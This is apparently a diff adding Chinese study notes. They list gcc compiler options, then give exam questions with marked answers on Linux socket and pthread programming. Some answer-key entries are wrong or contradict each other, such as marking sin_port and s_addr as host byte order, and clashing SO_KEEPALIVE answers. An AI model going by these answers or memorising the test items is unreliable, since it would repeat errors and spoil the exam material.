+　　在你是用#include"file"的时候,gcc/g++会先在当前目录查找你所制定的头文件,如
+果没有找到,他回到缺省的头文件目录找,如果使用-I制定了目录,他
+　　回先在你所制定的目录查找,然后再按常规的顺序去找.
+　　对于#include<file>,gcc/g++会到-I制定的目录查找,查找不到,然后将到系统的缺
+省的头文件目录查找
+　　
+-I-
+　　就是取消前一个参数的功能,所以一般在-Idir之后使用
+　　
+-idirafter dir
+　　在-I的目录里面查找失败,讲到这个目录里面查找.
+　　
+-iprefix prefix
+-iwithprefix dir
+　　一般一起使用,当-I的目录查找失败,会到prefix+dir下查找
+　　
+-nostdinc
+　　使编译器不再系统缺省的头文件目录里面找头文件,一般和-I联合使用,明确限定头
+文件的位置
+　　
+-nostdin C++
+　　规定不在g++指定的标准路经中搜索,但仍在其他路径中搜索,.此选项在创libg++库
+使用
+　　
+-C
+　　在预处理的时候,不删除注释信息,一般和-E使用,有时候分析程序，用这个很方便的
+
+　　
+-M
+　　生成文件关联的信息。包含目标文件所依赖的所有源代码你可以用gcc -M hello.c
+来测试一下，很简单。
+　　
+-MM
+　　和上面的那个一样，但是它将忽略由#include<file>造成的依赖关系。
+　　
+-MD
+　　和-M相同，但是输出将导入到.d的文件里面
+　　
+-MMD
+　　和-MM相同，但是输出将导入到.d的文件里面
+　　
+-Wa,option
+　　此选项传递option给汇编程序;如果option中间有逗号,就将option分成多个选项,然
+后传递给会汇编程序
+　　
+-Wl.option
+　　此选项传递option给连接程序;如果option中间有逗号,就将option分成多个选项,然
+后传递给会连接程序.
+　　
+-llibrary
+　　制定编译的时候使用的库
+　　例子用法
+　　gcc -lcurses hello.c
+　　使用ncurses库编译程序
+　　
+-Ldir
+　　制定编译的时候，搜索库的路径。比如你自己的库，可以用它制定目录，不然
+　　编译器将只在标准库的目录找。这个dir就是目录的名称。
+　　
+-O0
+-O1
+-O2
+-O3
+　　编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高　
+　 　　
+-g
+　　只是编译器，在编译的时候，产生调试信息。
+　　
+-gstabs
+　　此选项以stabs格式声称调试信息,但是不包括gdb调试信息.
+　　
+-gstabs+
+　　此选项以stabs格式声称调试信息,并且包含仅供gdb使用的额外调试信息.
+　　
+-ggdb
+　　此选项将尽可能的生成gdb的可以使用的调试信息.
+-static
+　　此选项将禁止使用动态库，所以，编译出来的东西，一般都很大，也不需要什么
+动态连接库，就可以运行.
+-share
+　　此选项将尽量使用动态库，所以生成文件比较小，但是需要系统由动态库.
+-traditional
+　　试图让编译器支持传统的C语言特性
+
+
+* 试题集锦
+
+** 填空题
+1.基于TCP通信中,主动关闭连接的一方会在TIME_WAIT状态下等待 #2MSL# 长度的时间.因此主动关闭的一方程序无法马上重新启动并再次绑定相同的IP地址与端口.这时使用函数 #setsockopt# 并在参数中指定套接字选项 #SO_REUSEADDR#
+
+2.名字到IP地址的解析使用的函数是 #gethostbyname# ,IP地址到域名的解析函数是 #gethostbyaddr#
+
+3.为保证"大端"和"小端"字节序的机器之间能相互通信,需在发生多字节整数时,将主机字节序转换成 #网络字节序#
+
+4.socket()函数可以创建三类套接字,分别是 #TCP套接字,UDP套接字,原始套接字#
+
+5.bind(),connect()等函数在出错时均会返回-1,具体出错的原因的错误代码可以在全局变量 #errno# 中找到,调用 #perror# 可以将错误代码转换成为它对应的字符串信息.
+
+6.在TCP连接中,若需要关闭某个方向的连接,可以使用函数 #shutdown#
+
+7.gethostname(char *name, size_t namelen)函数的功能是 #返回当前主机的名字,name是指向主机名存储位置的指针,namelen是此数组的大小#
+
+8.pselect(int maxfd, fd_set *readset, fd_set *writeset, fd_set *exceptset, const struct timeval *timeout, const sigset_t *sigmask)函数的maxfd参数的值是 #被测试描述字个数# , timeout参数定义的超时时间精确到 #微秒#, sigmask参数的作用是 #阻塞信号# ,
+pselect函数的返回值有三种情况,返回值为0表示 #超时# ,返回值大于0表示 #已经准备好的描述符数# ,而返回值为-1时表示出错.
+
+9.设置SO_KEEPALIVE选项的作用是 #保持连接检测对方主机是否崩溃,避免服务器永远陷入TCP连接的输入#
+
+10.pthread_key_create(pthread_key_t *key, void (* destructor)(void *value))函数的作用是 #在函数内部分配一个TSD的关键字# , 其中destructor是 #可选的析构函数,可以和每个关键字联系# , value是 #与本线程相关的值# , value 的默认值是 #指向动态分配的内存区域#.
+
+11.基于TCP协议的服务器端程序中,需要两个描述符,它们分别是由 #socket()# 函数创建的负责 #监听描述符用来监听一个端口,当有一个客户与服务器连接的时候,它使用这个端口号,而此时这个端口号正与这个套接字关联# 的描述符, 和由 #accept()# 函数创建的负责 #已连接描述符会默认阻塞进程,直到有一个客户连接建立后立即返回,它返回的是一个新可用的套接字,这个套接字是连接套接字# 的描述符.
+
+13.函数bind返回的是一个常见错误:所绑定的地址被其他进程所使用,为解决这个问题,我们可以通过调用 #setsockopt# 函数, 并为该函数的Optname设置形参传递 #SO_REUSEADDR# 参数,避免这个错误
+
+14.基于TCP套接字程序中,服务器可以通过 #accept# 函数返回与之通信的当前客户端的套接字地址结构
+
+15.pthread_detach(pthread_t tid)的作用是将一个 #联合的# 线程变成 #可分离的# 线程.
+
+17.linux操作系统中支持五种I/O模型,分别是 #I/O复用,异步I/O,驱动I/O,阻塞I/O模型和非阻塞I/O模型#
+
+18.#pthread_key_create#函数在进程内部分配一个标志TSD的关键字,并且该函数其中一个形参是可选的析构函数,当系统调用该析构函数时,传递的形参是 #value#
+
+19.INADDR_ANY调用bind的服务器,在接受连接后,调用 #getsockname# 函数获取系统选择的IP地址.
+
+20.如果用户程序为发送网络数据报结构自己的IPv4头部,需创建 #原始# 套接字, 并且前提是: 调用 #socket# 函数,给套接字设置 #SOCK_RAW# 选项
+
+
+** 判断题
+
+
+1. [F] 在用pthread库编写的多线程程序中,若主线程退出,则主线程创建的新线程将继续运行
+
+2. [F] 在TCP网络程序中,connect()函数用于客户端向服务器发起链接而在UDP网络程序中,由于UDP是面向无连接的,所以connect()函数不能用于UDP连接
+
+3. [T] inet_ntoa()函数可以将32位的网络字节序二进制IPv4地址转换程相应的字符串形式的IP地址,但不能将二进制IPv6地址转换成相应的字符串形式的IP地址
+
+4. [T] 服务器程序通常都会调用bind()函数以绑定监听地址,而客户端则很少调用它
+
+5. [T] 当一个客户SYN到达时,若未完成连接队列和已完成连接队列都是满的,TCP就忽略此分节,且不发送RST
+
+6. [F] 调用close()函数将立即关闭发送与接收这两个方向的TCP连接而不管将关闭的套接字的引用情况
+只是将计数减一不会引发TCP终止操作
+
+7. [F] 在TCP客户服务器通信中,若服务器端崩溃,则可以通过重启服务器让正在进行通信继续
+
+8. [T] TCP迭代服务器在某一时刻最多只能存在一个客户端与之简历的通信连接,而并发服务器在某一时刻可以存在多个客户端与之的通信连接
+
+9. [T] 互斥锁是一种专用于进程间数据同步的计数
+
+10. [T] 当子进程正常或异常终止时,系统内核会向其父进程发送SIGCHLD信号
+正常,结束,中断,或恢复执行内核都会发送 SIGCHLD
+
+11. [T] 可以使用原始套接口编程伪造IP数据包实现DoS攻击
+
+12. [T] 在多进程编程中,父进程用于监听,子进程用于为已经连接客户端提供服务,则父进程必须关闭已连接套接字,子进程必须关闭监听套接字
+
+13. [F] 调用bind()函数时,必须指明IP地址与端口号,而不能让内核来选择IP地址与端口号
+
+14. [T] 调用select函数可以实现与sleep函数一样的延时功能
+
+15. [T] connect()函数的作用是发起建立连接的请求
+
+16. [T] 基于TCP协议的服务器端程序,可以通过accept()函数获得与之通信的客户端的IP地址和端口号
+
+17. [F] 基于UDP协议的服务端和客户端程序,在接收和发送数据时,必须使用sendto()和recvform()函数
+read write
+
+18. [T] fork()函数和vfork()函数都可以创建子进程,所以基于这两个函数都可以实现多进程并发服务器
+
+19. [F] 线程可以调用exit()函数退出,而且对统一进程的其它线程不会造成影响
+exit结束整个程序
+
+20. [F] pthread_join()可以等待任意线程的退出
+不能等待任一线程结束
+
+21. [T] 标识线程专用数据的关键字key是进程唯一的.
+
+22. [T] 使用I/O复用技术可以实现并发服务器
+
+23. [F] 对SO_KEEPALIVE选项中时间参数的修改,会影响到主机中打开该选项的所有套接字
+只针对相应的
+
+24. [F] gethostbyname(const char *hostname)函数不允许将IP地址作为函数的参数
+
+25. [T] SO_LINGER选项可以改变TCP套接字关闭连接时的缺省行为
+
+26. [T] 只要创建了原始套接字就可以自行构造IPv4的首部
+
+27. [F] 可以对未加互斥锁的数据进行解锁
+
+28. [T] 使用互斥锁可以保证,在同一时间内,只允许一个线程访问共享数据
+
+29. [T] select()函数可以实现计时器功能
+
+30. [F] 由确定通信的五元组(本地协议,本地IP,本地端口,远程协议,远程IP,远程端口)可知,该(本地TCP,本地IP,本地端口,远程UDP,远程IP,远程端口)六元组所标识网络中一个连接可以进行正常的网络通信
+
+31. [F] 套接口是计算机操作系统为TCP/UDP协议与IP协议之间进行数据交互提供的接口,又称套接字
+套接口与套接字是两个东西
+
+32. [T] 在IPv4套接字地址结构中,成员sin_port是用来存储主机字节顺序端口号
+
+33. [T] 默认情况下,close函数将套接字的访问次数减1,并丢弃发送缓冲区和接受缓冲区的数据,仅在本次计数为0时才关闭套接字
+
+34. [T] UDP套接字编程,调用recvfrom函数可以获得通信的对方的套接字地址结构
+
+35. [F] wait()函数可以处理同时退出的多个线程在进行
+
+36. [F] 一个线程的崩溃不会影响同一进程中的其他线程
+线程没有自己的地址空间,非法地址读写崩溃,整个进程也是错误的
+
+37. [T] 在多线程并发服务器中,主线程生成子线程后,在主线程中要关闭已连接描述符,在子线程中要关闭监听描述字
+
+38. [T] 标识线程专用数据的关键字key是进程唯一的
+
+39. [T] stdin设为非阻塞后,不能使用标准输入输出函数操作该句柄,而要通过read来操作
+
+40. [T] 非阻塞I/O的实现可以通过fcntl()来改变描述符的标志来实现
+
+41. [T] I/O复用模型调用select或poll,进程阻塞于这两个系统调用上,而不是阻塞在真正的I/O系统调用上
+
+42. [T] 在TCP服务器,为了接受更多的数据,可以在接收数据调用打开read函数时,临时更改套接字接受缓冲区的大小
+
+43. [F] 改变某个描述符的SO_KEEPALIVE选项值,不会影响到主机上打开的其他描述符
+
+44. [T] 只要创建了原始套接字就可以自行构造IP报文的首部
+
+45. [F] 由确定通信的五元组(本地协议,本地IP,本地端口,远程协议,远程IP,远程端口)可知,该(本地TCP,本地IP,本地端口,远程UDP,远程IP,远程端口)六元组所标识网络中一个连接可以进行正常的网络通信
+
+46. [F] 套接口是计算机操作系统为TCP/UDP协议与IP协议之间进行数据交互提供的接口,又称套接字
+
+47. [F] 在TCP的客户端程序中,如果connect()函数调用失败,则还可以继续使用该套接字
+套接字不能再使用必须关闭
+
+48. [T] 在IPv4套接字地址结构中,in_addr结构体中的s_addr成员,存储的便是我们主机字节序的32位IPv4地址
+
+49. [F] vfork()函数创建子进程后,父进程和子进程谁先执行,这取决于内核所使用的调度算法,有可能父进程先于子进程执行,也有可能子进程先于父进程执行
+
+50. [F] 在UDP套接字程序中,客户端与服务端通信时,必须使用sendto()和recvfrom()函数
+write read
+
+51. [T] waitpid()函数可以处理同时退出的多个线程在进行
+
+52. [F] 对于非阻塞I/O模型,进程从调用recvfrom函数,将数据从内核拷贝到用户空间整个过程都不会阻塞进程的执行
+在数据拷贝的时候阻塞
+
+53. [T] 在多线程并发服务器中,为防止父子线程对描述符的操作造成混乱,在主线程创建子线程后,应在父线程中关闭已连接描述符
+
+54. [T] 创建的子线程默认情况可联合的
+
+55. [T] 在TCP的客户端程序中,为了接受更多的数据,可以在接收数据调用打开read函数时,临时更改套接字接受缓冲区的大小
+
+56. [F] SO_SNDLOWAT用来设置套接字发送缓冲区的发送低潮,当发送缓冲区的现有数据量大于发送低潮时,便可以发送数据,select返回可写
+小于时触发I/O
